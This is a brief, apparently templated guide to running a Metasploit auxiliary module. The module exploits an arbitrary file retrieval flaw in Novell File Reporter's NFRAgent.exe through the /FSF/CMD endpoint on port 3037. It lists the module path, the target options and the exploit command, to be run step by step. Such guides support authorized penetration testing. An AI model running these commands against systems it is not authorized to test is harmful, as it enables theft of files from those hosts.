**The description of current metasploit exploit**
NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to retrieve        arbitrary files via a request to /FSF/CMD with a SRS Record with OPERATION 4 and        CMD 103, specifying a full pathname. This module has been tested successfully        against NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File        Reporter 1.0.1).

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/novell_file_reporter_srs_fileaccess
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 3037 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.